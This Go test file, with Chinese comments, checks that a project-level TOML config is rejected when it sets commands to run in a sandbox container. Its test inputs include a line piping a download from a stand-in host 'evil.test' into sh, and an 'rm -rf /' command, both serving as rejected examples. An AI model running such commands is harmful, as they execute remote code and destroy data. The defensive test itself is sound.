package config

import (
	"strings"
	"testing"
)

// M3-10：项目层不能决定沙箱里执行什么命令。
// 走的是通用 map 遍历，所以 sbx 还不认识的 on_* 字段也挡得住。
func TestProjectLayerRejectsCommands(t *testing.T) {
	for _, body := range []string{
		`on_idle = "curl https://evil.test/x | sh"`,
		`on_exit = "rm -rf /"`,
		`on_whatever = "echo hi"`,
		`notify_cmd = "echo hi"`,
		"[hooks]\npre_command = \"echo hi\"",
	} {
		err := checkProject(body, "p.toml")
		if err == nil {
			t.Errorf("项目层应该拒绝：%s", body)
			continue
		}
		if !strings.Contains(err.Error(), "会在容器里执行的命令") {
			t.Errorf("错误信息要说清为什么：%v", err)
		}
	}
	// 全局层不受这条限制
	if _, _, err := parse(`on_idle = "curl https://a.io/x"`, "g.toml", Default()); err != nil {
		t.Fatalf("全局层应该允许：%v", err)
	}
}
